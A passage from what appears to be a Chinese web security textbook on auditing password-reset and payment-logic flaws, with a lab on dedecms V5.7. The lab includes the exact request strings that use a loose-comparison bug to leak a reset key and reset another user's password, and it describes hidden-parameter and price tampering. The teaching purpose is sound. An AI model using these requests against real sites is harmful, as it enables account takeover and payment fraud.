![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image538.jpg)\r
\r
\u56FE11-17 \u4FEE\u6539\u5BC6\u7801\u6848\u4F8B\u56FE\r
\r
\u91CD\u7F6E\u81EA\u5DF1\u7528\u6237\u5BC6\u7801\u6700\u540E\u4E00\u6B65\u6293\u53D6\u7684\u6570\u636E\u5305\uFF0C\u5982\u56FE11-18\u6240\u793A\uFF0C\u5E76\u5C06\u5176\u4E2D\u7684Cookie\u503C\u8FDB\u884C\u66FF\u6362\uFF0C\u4ECE\u800C\u91CD\u542F\u7528\u6237wangshuai\u7684\u5BC6\u7801\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image540.jpg)\r
\r
\u56FE11-18 \u91CD\u7F6E\u5BC6\u7801\u6570\u636E\u5305\r
\r
\uFF088\uFF09 \u4FEE\u6539\u4E2A\u4EBA\u4FE1\u606F\u65F6\u66FF\u6362\u9690\u85CF\u5B57\u6BB5\u503C\r
\r
\u5728\u6267\u884C\u4FEE\u6539\u4FE1\u606F\u7684SQL\u8BED\u53E5\u65F6\uFF0C\u7528\u6237\u7684\u5BC6\u7801\u4E5F\u88AB\u5F53\u505A\u5B57\u6BB5\u6267\u884C\u4E86\uFF0C\u800C\u4E14\u662F\u6839\u636E\u9690\u85CF\u53C2\u6570loginid\u6765\u6267\u884C\u7684\u3002\u8FD9\u6837\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u4FEE\u6539\u9690\u85CF\u53C2\u6570loginid\u7684\u503C\uFF0C\u4ECE\u800C\u4FEE\u6539\u5176\u4ED6\u7528\u6237\u7684\u5BC6\u7801\uFF0C\u5176\u6D41\u7A0B\u56FE11-19\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image542.jpg)\r
\r
\u56FE11-19 \u901A\u8FC7\u9690\u85CF\u53C2\u6570\u4FEE\u6539\u5BC6\u7801\u6D41\u7A0B\u56FE\r
\r
\u6D4B\u8BD5\u65B9\u6CD5\uFF1A\u5728\u4FEE\u6539\u4E2A\u4EBA\u8D44\u6599\u7684\u65F6\u5019\uFF0C\u6293\u53D6\u6570\u636E\u5305\u3002\u7136\u540E\u4FEE\u6539\u6570\u636E\u5305\u7684\u53C2\u6570\u548C\u5BF9\u5E94\u7684\u503C\uFF0C\u53C2\u6570\u540D\u4E00\u822C\u53EF\u4EE5\u5728\u5176\u4ED6\u4F4D\u7F6E\u627E\u5230\uFF0C\u901A\u8FC7\u66FF\u6362\u9690\u85CF\u53C2\u6570\u7684\u65B9\u6CD5\u5373\u53EF\u4FEE\u6539\u4ED6\u4EBA\u7684\u5BC6\u7801\u7B49\u4FE1\u606F\u3002\u4E0B\u9762\u7ED9\u51FA\u67D0\u7F51\u7AD9\u901A\u8FC7\u4FEE\u6539\u7528\u6237\u4E2A\u4EBA\u4FE1\u606F\u91CD\u7F6E\u5BC6\u7801\u7684\u6848\u4F8B\uFF0C\u5176\u4E2A\u4EBA\u4FE1\u606F\u7EF4\u62A4\u9875\u9762\u5982\u56FE11-20\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image544.jpg)\r
\r
\u56FE11-20 \u4FEE\u6539\u4E2A\u4EBA\u4FE1\u606F\u56FE\r
\r
\u4E0A\u8FF0\u66F4\u65B0\u4E2A\u4EBA\u4FE1\u606F\u7684\u9875\u9762\u4EE3\u7801\u5982\u56FE11-21\u6240\u793A\uFF0C\u8BE5\u9875\u9762\u6E90\u4EE3\u7801\u627E\u5230\u4E86\u4E00\u4E2A\u53C2\u6570loginId\uFF0C\u8BE5\u53C2\u6570\u662F\u5BF9\u5E94\u7528\u6237\u8EAB\u4EFD\u3002\r
\r
\u5176\u8BBF\u95EE\u8D85\u94FE\u63A5\u4E3A\uFF1Ahref=\u201D/ua/login/login.php?loginId=xxx\u201D\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image546.gif)\r
\r
\u56FE11-21 \u4FEE\u6539\u4E2A\u4EBA\u4FE1\u606F\u524D\u53F0\u4EE3\u7801\r
\r
\u66F4\u65B0\u4E2A\u4EBA\u4FE1\u606F\u6293\u53D6\u7684\u6570\u636E\u5305\u5982\u56FE11-22\u6240\u793A\uFF0C\u5728\u6570\u636E\u5305\u4E2D\u6DFB\u52A0\u9690\u85CF\u5B57\u6BB5loginId\u5E76\u5C06\u503C\u4FEE\u6539\u4E3A\u4ED6\u4EBA\u7684\u7528\u6237\uFF0C\u53D1\u5305\u8FD4\u56DE\u4FEE\u6539\u6210\u529F\u3002\u5373\u53EF\u6210\u529F\u7684\u5C06\u7528\u6237\u5BC6\u7801\u4FEE\u6539\u4E3A\u5176\u4ED6\u7528\u6237\u5BC6\u7801\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image548.jpg)\r
\r
\u56FE11-22 \u66F4\u65B0\u4E2A\u4EBA\u4FE1\u606F\u6570\u636E\u5305\u56FE\r
\r
### 11.2.3 \u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u9632\u5FA1\u65B9\u6CD5\r
\r
  \u4E0B\u9762\u7ED9\u51FA\u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u7684\u9632\u5FA1\u65B9\u6CD5\uFF1A\r
\r
l \u8F83\u5C11\u5BC6\u7801\u91CD\u7F6E\u8FC7\u7A0B\u4E2D\u7684\u7528\u6237\u53EF\u63A7\u53C2\u6570\uFF1B\r
\r
l \u589E\u52A0\u7F51\u7AD9\u9A8C\u8BC1\u7801\u529F\u80FD\u5904\u7684\u590D\u6742\u5EA6\uFF1B\r
\r
l \u9650\u5236\u9A8C\u8BC1\u7801\u9519\u8BEF\u586B\u5199\u7684\u6B21\u6570\uFF1B\r
\r
l \u589E\u52A0\u9A8C\u8BC1\u7801\u9519\u8BEF\u5931\u6548\u65F6\u95F4\uFF1B\r
\r
l \u5BF9\u9A8C\u8BC1\u7528\u6237\u3001\u624B\u673A\u53F7\u548C\u90AE\u7BB1\u7B49\u5173\u952E\u6A21\u5757\u4F4D\u7F6E\u6DFB\u52A0\u9A8C\u8BC1\u7801\u3002\r
\r
### 11.2.4   \u5B9E\u9A8C\uFF1A\u4EFB\u610F\u7528\u6237\u5BC6\u7801\u91CD\u7F6E\u5B9E\u8DF5\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9dedecms V5.7\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728\u4EFB\u610F\u7528\u6237\u5BC6\u7801\u91CD\u7F6E\u6F0F\u6D1E\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u800310.2.1\u8282\uFF1A\u5BC6\u7801\u91CD\u7F6E\u6F0F\u6D1E\u4ECB\u7ECD\uFF1B10.2.2\u8282\uFF1A\u5BC6\u7801\u91CD\u7F6E\u6F0F\u6D1E\u7684\u5E38\u89C1\u6848\u4F8B\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u5BC6\u7801\u91CD\u7F6E\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1Bdedecms V5.7\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09 \u5BA1\u8BA1\u9636\u6BB5\r
\r
\u8FDB\u5165member/resetpassword.php\u9875\u9762\uFF0C\u4EE3\u7801\u5982\u4E0B\u3002\u7A0B\u5E8F\u6D41\u7A0B\uFF1A\r
\r
l \u9996\u5148\u63A5\u6536id\u53C2\u6570\uFF0C\u5E76\u7528\u6B63\u5219\u8868\u8FBE\u5F0F\u5C06\u975E\u6570\u5B57\u66FF\u6362\u4E3A\u7A7A\u5B57\u7B26\u3002\r
\r
l \u7136\u540E\u5229\u7528id\u53C2\u6570\u62FC\u63A5\u6210SQL\u8BED\u53E5\u8FDB\u884C\u6570\u636E\u5E93\u67E5\u8BE2\u3002\r
\r
l \u83B7\u53D6safequestion\u548Csafeanswer\u4E24\u4E2A\u53C2\u6570\uFF0C\u5982\u679C\u4E3A\u7A7A\u76F4\u63A5\u5C06\u53C2\u6570\u7F6E\u4E3A\u7A7A\u3002\r
\r
l \u5C06\u6570\u636E\u5E93\u67E5\u8BE2\u7684\u7ED3\u679C$safeanswer\u3001\u95EE\u9898$safequestion\u548C\u6B63\u786E\u7B54\u6848\u8FDB\u884C\u5BF9\u6BD4\uFF0C\u5982\u679C\u6210\u529F\u5219\u8C03\u7528sn\u51FD\u6570\u4FEE\u6539\u5BC6\u7801\u3002\r
\r
\r
\r
else if($dopost == "safequestion"){\r
   $mid = preg_replace("#[^0-9]#", "", $id);//\u5C06\u7279\u6B8A\u5B57\u7B26\u66FF\u6362\u4E3A\u7A7A\u5B57\u7B26\r
   $sql = "SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'";                //\u62FC\u63A5SQL\u8BED\u53E5\r
   $row = $db->GetOne($sql);        //\u6267\u884CSQL\u8BED\u53E5\r
   if(empty($safequestion)) $safequestion = '';\r
   if(empty($safeanswer)) $safeanswer = '';\r
   if(**$row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer**){\r
\r
//\u5982\u679C$safeanswer\u4E0E$safequestion\u90FD\u6B63\u786E\u5219\u8C03\u7528sn\u51FD\u6570\r
     **sn**($mid, $row['userid'], $row['email'], 'N');\r
     exit();}\r
   else{ShowMsg("\u5BF9\u4E0D\u8D77\uFF0C\u60A8\u7684\u5B89\u5168\u95EE\u9898\u6216\u7B54\u6848\u56DE\u7B54\u9519\u8BEF","-1");\r
     exit();\r
   }}\r
\r
\r
\r
\u4EE3\u7801$row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer\u5B58\u5728\u6F0F\u6D1E\u3002\u56E0\u4E3A\u5224\u65AD\u4F7F\u7528\u7684\u53CC\u7B49\u53F7\u201C==\u201D\uFF0C\u800C\u53CC\u7B49\u53F7\u5224\u65AD\u7684\u65F6\u5019\u5E76\u4E0D\u4F1A\u68C0\u6D4B\u7C7B\u578B \uFF0C\u4ECE\u800C\u9519\u8BEF\u7684\u5224\u65AD\u6570\u636E\u76F8\u7B49\u3002\u5982\u679C\u7528\u6237\u5728\u8FDB\u884C\u7528\u6237\u6CE8\u518C\u65F6\uFF0C\u672A\u8BBE\u7F6E\u95EE\u9898\u548C\u7B54\u6848\uFF0C\u7A0B\u5E8F\u4F1A\u81EA\u52A8\u628A\u95EE\u9898\uFF08safequestion\uFF09\u8BBE\u7F6E\u4E3A0\u3001\u7B54\u6848\uFF08safeanswer\uFF09\u8BBE\u7F6E\u4E3A\u7A7A\uFF0C\u5C06\u5BFC\u81F4\u6F0F\u6D1E\u7684\u5229\u7528\u3002\u5982\u679C\u4F20\u8F93\u5185\u5BB9\u4E3A\u201Csafequestion=0.0&safeanswer=\u201D\u5219\u53EF\u76F4\u63A5\u7ED5\u8FC7if\u5224\u65AD\u8FDB\u5165\u5BC6\u7801\u4FEE\u6539\u90E8\u5206\u3002\r
\r
\u6CE8\u610F\uFF1A\u8BFB\u8005\u53EF\u80FD\u6709\u4E2A\u95EE\u9898\uFF1A\u4E3A\u4EC0\u4E48\u4F20\u9012\u503C0.0\u800C\u4E0D\u4F20\u8F930\uFF0C\u5982\u679C\u4F20\u8F93\u503C\u4E3A0\u7684\u8BDD\u201D0\u201D==\u201D0\u201D\u5C06\u76F4\u63A5\u7ED5\u8FC7if\u5224\u65AD\u3002\u4F46\u6B64\u65F6\u5B58\u5728\u95EE\u9898\uFF1Asafequestion\u9700\u8981\u88ABempty\u51FD\u6570\u68C0\u6D4B\uFF0C\u5F53empty\u68C0\u6D4B\u4F20\u8F93\u503C\u4E3A\u201C0\u201D\uFF0C\u5219\u4F1A\u8FD4\u56DEtrue\uFF0Cif\u5224\u65AD\u6355\u6349\u5230\u4E3A\u771F\uFF0C\u4F1A\u76F4\u63A5\u5C06$safequestion = ''\uFF0C\u800C\u201C0\u201D==\u201C\u201D\u7ED3\u679C\u4E3Afalse\uFF0C\u5219\u65E0\u6CD5\u7ED5\u8FC7\u5224\u65AD\u3002\r
\r
\u6210\u529F\u7ED5\u8FC7\u5224\u65AD\u8BED\u53E5\u540E\uFF0C\u7A0B\u5E8F\u5C06\u8C03\u7528sn\u51FD\u6570\uFF0C\u56E0\u6B64\u9700\u8981\u5BF9sn\u51FD\u6570\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u8BE5\u51FD\u6570\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
function sn($mid,$userid,$mailto, $send = 'Y')\r
 {\r
   global $db;\r
   $tptim= (60*10);\r
   $dtime = time();\r
   $sql = "SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'";\r
   $row = $db->GetOne($sql);\r
   if(!is_array($row))\r
   {  //\u53D1\u9001\u65B0\u90AE\u4EF6\uFF1B\r
     newmail($mid,$userid,$mailto,'INSERT',$send);}\r
  \u2026\u7701\u7565\u2026}\r
\r
\r
\r
\u7A0B\u5E8F\u9996\u5148\u4F7F\u7528\u51FD\u6570\u4F20\u8F93\u7684mid\u62FC\u63A5SQL\u8BED\u53E5\u4E3ASELECT * FROM #@__pwd_tmp WHERE mid = '$mid'\uFF0C\u67E5\u8BE2#@__pwd_tmp\u8868\u4E2Dmid\u4E0E\u53D8\u91CF$mid\u76F8\u7B49\u7684\u6570\u636E\u3002\u82E5\u67E5\u8BE2\u7ED3\u679C$row\u4E0D\u662F\u6570\u7EC4\u5C31\u8C03\u7528newmail\u51FD\u6570\u53D1\u9001\u90AE\u4EF6\u3002\r
\r
newmail\u51FD\u6570\u4EE3\u7801\u5229\u7528random()\u751F\u6210\u968F\u673A\u6570\uFF0C\u7136\u540E\u8FDB\u5165\u5230type==\u2019UPDATE\u2019,\u5C06randval\u968F\u673A\u503C\u8FDB\u884Cmd5\u52A0\u5BC6\uFF0C\u5E76\u66F4\u65B0\u5230dede__pwd_tmp\u8868\u4E2D\u3002\u66F4\u65B0\u6570\u636E\u540E\u7A0B\u5E8F\u4F1A\u8FDB\u5165\u5230send==\u2018N\u2019\u6D41\u7A0B\uFF0C\u4F1A\u628A\u4E34\u65F6\u5BC6\u7801\u4EE5key\u7684\u5F62\u5F0F\u6CC4\u9732\u5230\u54CD\u5E94\u62A5\u6587\u4E2D\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
elseif($type == 'UPDATE')\r
 {  //\u5C06\u4EFB\u610F\u6570\u8FDB\u884Cmd5\u52A0\u5BC6\r
   **$key = md5($randval);**\r
   $sql = "UPDATE \`#@__pwd_tmp\` SET \`pwd\` = '$key',mailtime = '$mailtime' WHERE \`mid\` ='$mid';";//\u66F4\u65B0\u8868#@__pwd_tmp\u6570\u636E\r
   if($db->ExecuteNoneQuery($sql))//\u6267\u884Csql\u8BED\u53E5\r
   {\r
     if($send == 'Y')\r
     {\r
       sendmail($mailto,$mailtitle,$mailbody,$headers);\r
       ShowMsg('EMAIL\u4FEE\u6539\u9A8C\u8BC1\u7801\u5DF2\u7ECF\u53D1\u9001\u5230\u539F\u6765\u7684\u90AE\u7BB1\u8BF7\u67E5\u6536', 'login.php');\r
     }\r
     **elseif($send == 'N')//****\u5982\u679C\u53D8\u91CF$send\u4E3AN\u5219\u5C06\u4FE1\u606F\u6253\u5370\u51FA\u6765\uFF0C\u4FE1\u606F\u5305\u62EC\u9A8C\u8BC1\u7801key\r
**     { return ShowMsg('\u7A0D\u540E\u8DF3\u8F6C\u5230\u4FEE\u6539\u9875', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;**key=".$randval**);}\r
\r
\r
\r
\uFF082\uFF09 \u6267\u884C\u6D41\u7A0B\r
\r
\u91CD\u7F6E\u7528\u6237\u5BC6\u7801\u6B63\u786E\u6D41\u7A0B\u662F\uFF1Amember/resetpassword.php\u6587\u4EF6\u83B7\u53D6\u5BC6\u7801\u90E8\u5206\uFF0C\u4ECE__pwd_tmp\u8868\u4E2D\u8FDB\u884C\u67E5\u8BE2\u3002\u7A0B\u5E8F\u8FDB\u884C\u52A0\u8F7D\u6A21\u677F\uFF0C\u8BA9\u7528\u6237\u586B\u5199\u5BC6\u7801\uFF0C\u586B\u5199\u5B8C\u5BC6\u7801\u4EE5\u540E\u4F1A\u8FDB\u5165\u91CD\u7F6E\u5BC6\u7801\u8FC7\u7A0B\u4E2D\uFF0C\u8FD9\u90E8\u5206\u4F1A\u6BD4\u5BF9\u7528\u6237\u4F20\u8F93\u7684\u4E34\u65F6key\u548C\u6570\u636E\u5E93\u5B58\u50A8\u7684pwd\u662F\u5426\u4E00\u81F4\uFF0C\u5982\u679C\u4E00\u81F4\u5219\u4F1A\u6210\u529F\u4FEE\u6539\u5BC6\u7801\u3002\r
\r
\u56FE11-23\u4E3A\u8BE5CMS\u5229\u7528\u6D41\u7A0B\uFF0C\u9996\u5148\u901A\u8FC7\u53D1\u9001\u8BF7\u6C42/member/resetpassword.php?id=2&safequestion=0.0&safeanswer=&dopost=safequestion\u3002\u8C03\u7528newmail\u51FD\u6570\u4E2D\u7684UPDATE\u6D41\u7A0B\uFF0C\u56DE\u663E\u9A8C\u8BC1\u7801key\u4E3ACkeL9Uze\u3002\u7136\u540E\u6267\u884C\u91CD\u7F6E\u5BC6\u7801\u7B2C\u4E8C\u6B65\uFF0C\u5C06\u8BE5\u9A8C\u8BC1\u7801\u8FDB\u884C\u6821\u9A8C\u5E76\u8FDB\u884C\u5BC6\u7801\u91CD\u7F6E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image550.jpg)\r
\r
\u56FE11-23 \u6F0F\u6D1E\u5229\u7528\u6D41\u7A0B\u56FE\r
\r
\uFF083\uFF09 \u5229\u7528\u9636\u6BB5\r
\r
\u9996\u5148\u8BBF\u95EEhttp://IP\uFF0C\u6CE8\u518C\u4E24\u4E2A\u65B0\u7528\u6237target\u548Cattacker\uFF0C\u5176\u4E2Dtarget\u4E3A\u76EE\u6807\u7528\u6237\uFF0Cattacker\u4E3A\u653B\u51FB\u7528\u6237\u3002\u6CE8\u610F\uFF1A\u4E3A\u4E86\u6A21\u62DF\u6F0F\u6D1E\uFF0C\u6CE8\u518Ctarget\u7528\u6237\u65F6\uFF0C\u4E0D\u8981\u8BBE\u7F6E\u5B89\u5168\u95EE\u9898\u3002\u4EE5attacker\u7528\u6237\u8EAB\u4EFD\u8BBF\u95EE\u8DEF\u5F84\u4E3A\uFF1Ahttp://ip/member/resetpassword.php?id=2&safequestion=0.0&safeanswer=&dopost=safequestion\r
\r
\u4F7F\u7528BurpSuite\u6293\u53D6\u5230\u4E0A\u8FF0\u8BF7\u6C42\u7684\u6570\u636E\u5305\uFF0C\u5982\u56FE11-24\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image552.jpg)\r
\r
\u56FE11-24 \u8BF7\u6C42\u6570\u636E\u5305\u56FE\r
\r
\u7136\u540E\u8F6C\u53D1\u8BE5\u6570\u636E\u5305\u5C06\u6CC4\u6F0F\u7684\u9A8C\u8BC1\u7801\u8FDB\u884C\u63D0\u53D6\uFF0C\u5982\u56FE11-25\u6240\u793A\uFF0C\u9A8C\u8BC1\u7801\u4E3ACkeL9Uze\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image554.gif)\r
\r
\u56FE11-25 \u6CC4\u9732\u9A8C\u8BC1\u7801\u56FE\r
\r
\u767B\u5F55target\u7528\u6237\uFF0C\u8BBF\u95EE\u94FE\u63A5\u4E3A\uFF1Ahttp://ip/member/resetpassword.php?id=2&key=CKeL9Uze&dopost=getpasswd\u3002\uFF08key\u5B57\u6BB5\u7684\u503C\u5E94\u4E0E\u5B9E\u9645\u6293\u5230\u7684\u54CD\u5E94\u5305\u4E2D\u7684\u5B57\u6BB5\u503C\u76F8\u4E00\u81F4\uFF09\uFF0C\u8DE8\u8D8A\u91CD\u7F6E\u5BC6\u7801\u6D41\u7A0B\u7B2C\u4E00\u6B65\uFF0C\u76F4\u63A5\u6210\u529F\u8FDB\u5165target\u7528\u6237\u91CD\u7F6E\u5BC6\u7801\u8FC7\u7A0B\u7B2C\u4E8C\u6B65\uFF0C\u76F4\u63A5\u901A\u8FC7\u9875\u9762\u91CD\u7F6E\u5BC6\u7801\uFF0C\u5982\u56FE11-26\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image556.jpg)\r
\r
\u56FE11-26 \u91CD\u7F6E\u5BC6\u7801\u56FE\r
\r
## 11.3 \u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E\r
\r
### 11.3.1 \u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E\u4ECB\u7ECD\r
\r
\u652F\u4ED8\u6F0F\u6D1E\u4E00\u822C\u51FA\u73B0\u5728\u7535\u5546\u7F51\u7AD9\u3001\u5728\u7EBF\u4EA4\u6613\u5E73\u53F0\u7B49\uFF0C\u5176\u4E2D\u5C06\u6D89\u53CA\u5728\u7EBF\u652F\u4ED8\u7684\u6D41\u7A0B\uFF0C\u800C\u652F\u4ED8\u529F\u80FD\u4E5F\u6709\u5F88\u591A\u903B\u8F91\u3002\u5982\u679C\u903B\u8F91\u8BBE\u8BA1\u4E0D\u5F53\uFF0C\u5219\u53EF\u80FD\u5BFC\u81F40\u5143\u8D2D\u4E70\u5546\u54C1\u7B49\u4E25\u91CD\u6F0F\u6D1E\u3002\u4EA4\u6613\u652F\u4ED8\u7684\u5B89\u5168\u95EE\u9898\u7ECF\u5E38\u51FA\u73B0\u5728\u8D2D\u7269\u7F51\u7AD9\u3001\u91D1\u878D\u7F51\u7AD9\u3001\u4FDD\u9669\u7F51\u7AD9\u3001\u79EF\u5206\u5546\u57CE\u4E2D\u3002\u4E0B\u9762\u7ED9\u51FA\u4EA4\u6613\u652F\u4ED8\u8FC7\u7A0B\u4E2D\u6613\u51FA\u73B0\u5B89\u5168\u95EE\u9898\u7684\u6D41\u7A0B\u5982\u56FE11-27\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image558.jpg)\r
\r
\u56FE11-27 \u652F\u4ED8\u5B89\u5168\u95EE\u9898\u56FE\r
\r
\u5E38\u89C1\u7684\u4EA4\u6613\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u5546\u6237\u5E73\u53F0\u4EA4\u6613\u8BA2\u5355\u6821\u9A8C\r
\r
\u7535\u5546\u7B49\u5546\u6237\u5E73\u53F0\u7684\u7528\u6237\u5C06\u4EA4\u6613\u8868\u5355\u63D0\u4EA4\u5230\u670D\u52A1\u5668\u4E2D\uFF0C\u670D\u52A1\u5668\u5FC5\u987B\u5BF9\u8BA2\u5355\u4FE1\u606F\u8FDB\u884C\u8BA1\u7B97\u6821\u9A8C\uFF0C\u5305\u62EC\uFF1A\u5546\u54C1\u91D1\u989D\u3001\u6570\u91CF\u3001\u5546\u54C1\u4FE1\u606F\u3001\u7528\u6237\u8EAB\u4EFD\u3001session\u4E2D\u7684\u4FE1\u606F\u7B49\u7B49\u3002\r
\r
l \u652F\u4ED8\u8BF7\u6C42\u8BA2\u5355\u7B7E\u540D\u6D41\u7A0B\r
\r
\u5546\u6237\u5E73\u53F0\u5C06\u652F\u4ED8\u8BF7\u6C42\u4FE1\u606F\u63D0\u4EA4\u7ED9\u652F\u4ED8\u5E73\u53F0\u65F6\uFF0C\u9700\u8981\u540C\u65F6\u5E26\u4E0A\u7B7E\u540D\u4FE1\u606F\uFF0C\u8BE5\u4FE1\u606F\u7528\u4E8E\u652F\u4ED8\u5E73\u53F0\u7EA6\u5B9A\u7684\u5546\u6237\u5BC6\u94A5\u4E32\u53CA\u7B7E\u540D\u7B97\u6CD5\u5BF9\u8BA2\u5355\u8FDB\u884C\u7B7E\u540D\uFF0C\u4F8B\u5982\uFF1Amd5\uFF08\u8BA2\u5355id+\u91D1\u989D+\u5546\u6237id+\u5546\u54C1id+\u5BC6\u94A5\u4E32\uFF09\u3002\r
\r
l \u652F\u4ED8\u7ED3\u679C\u9A8C\u8BC1\u7B7E\u540D\r
\r
\u5546\u6237\u5E73\u53F0\u63A5\u6536\u5230\u652F\u4ED8\u5E73\u53F0\u8BF7\u6C42\u540E\uFF0C\u8981\u5BF9\u652F\u4ED8\u7ED3\u679C\u7684\u7B7E\u540D\u8FDB\u884C\u9A8C\u7B7E\uFF0C\u4ECE\u800C\u907F\u514D\u88AB\u4F2A\u9020\u652F\u4ED8\u7ED3\u679C\u3002\r
\r
### 11.3.2 \u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E\u6316\u6398\r
\r
\u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E\u901A\u5E38\u9700\u6839\u636EWeb\u7A0B\u5E8F\u7684\u5B9E\u9645\u529F\u80FD\u70B9\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u901A\u8FC7\u5BF9\u6B64\u7C7B\u654F\u611F\u529F\u80FD\u70B9\u8FDB\u884C\u5BA1\u8BA1\u4ECE\u800C\u6316\u6398\u652F\u4ED8\u6F0F\u6D1E\u3002\u6613\u51FA\u73B0\u652F\u4ED8\u5B89\u5168\u95EE\u9898\u7684\u529F\u80FD\u70B9\u5305\u62EC\uFF1A\u7AD9\u70B9\u903B\u8F91\u95EE\u9898\u5BFC\u81F4\u7684\u652F\u4ED8\u6F0F\u6D1E\u3001\u5546\u54C1\u4EF7\u683C\u672C\u8EAB\u51FA\u73B0\u95EE\u9898\u3001\u7B2C\u4E09\u65B9\u652F\u4ED8\u51FA\u73B0\u95EE\u9898\u3002\r
\r
\u6B63\u5411\u8FFD\u8E2A\u53D8\u91CF\u4F20\u9012\u8FC7\u7A0B\uFF0C\u4ECE\u800C\u786E\u5B9A\u53C2\u6570\u4F20\u9012\u8FC7\u7A0B\u4E2D\u662F\u5426\u5B58\u5728\u66F4\u6539\u6216\u63A7\u5236\u53C2\u6570\u7684\u60C5\u51B5\u3002\u6613\u51FA\u73B0\u5B89\u5168\u95EE\u9898\u7684\u53C2\u6570\u5305\u62EC\uFF1A\u4EF7\u683C\u3001\u4F18\u60E0\u5238\u4EF7\u683C\u3001\u6298\u6263\u3001\u79EF\u5206\u62B5\u6263\u3001\u7269\u54C1\u6570\u91CF\u7B49\u3002\r
\r
### 11.3.3 \u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u5E38\u89C1\u5B89\u5168\u95EE\u9898\r
\r
\uFF081\uFF09   \u4FEE\u6539\u652F\u4ED8\u4EF7\u683C\r
\r
\u5E38\u89C1\u7684\u7F51\u7AD9\u652F\u4ED8\u6A21\u5757\u5728\u8D2D\u4E70\u5546\u54C1\u8FC7\u7A0B\u4E2D\u4E3B\u8981\u5305\u62EC\uFF1A\u8BA2\u8D2D\u3001\u786E\u8BA4\u4FE1\u606F\u3001\u4ED8\u6B3E\u3002\u4E0A\u8FF0\u4E09\u4E2A\u6B65\u9AA4\u4E2D\u7684\u4EFB\u610F\u4E00\u4E2A\u6B65\u9AA4\u90FD\u53EF\u80FD\u5B58\u5728\u4FEE\u6539\u4EF7\u683C\u7684\u6F0F\u6D1E\u3002\u7F51\u7AD9\u5F00\u53D1\u8FC7\u7A0B\u4E2D\uFF0C\u5F00\u53D1\u4EBA\u5458\u4E3A\u4E86\u65B9\u4FBF\uFF0C\u4F1A\u76F4\u63A5\u5728\u652F\u4ED8\u7684\u5173\u952E\u6B65\u9AA4\u6570\u636E\u5305\u4E2D\u76F4\u63A5\u4F20\u9012\u9700\u8981\u652F\u4ED8\u7684\u91D1\u989D\u3002\u800C\u8FD9\u79CD\u91D1\u989D\u540E\u7AEF\u6CA1\u6709\u505A\u6821\u9A8C\uFF0C\u4F20\u9012\u8FC7\u7A0B\u4E2D\u4E5F\u6CA1\u6709\u505A\u7B7E\u540D\uFF0C\u5BFC\u81F4\u53EF\u4EE5\u968F\u610F\u7BE1\u6539\u91D1\u989D\u63D0\u4EA4\u3002\u5BA1\u8BA1\u4EBA\u5458\u53EA\u9700\u8981\u6293\u5305\u627E\u5230\u6709\u91D1\u989D\u7684\u53C2\u6570\u4FEE\u6539\u6210\u4EFB\u610F\u503C\u5373\u53EF\u3002\r
\r
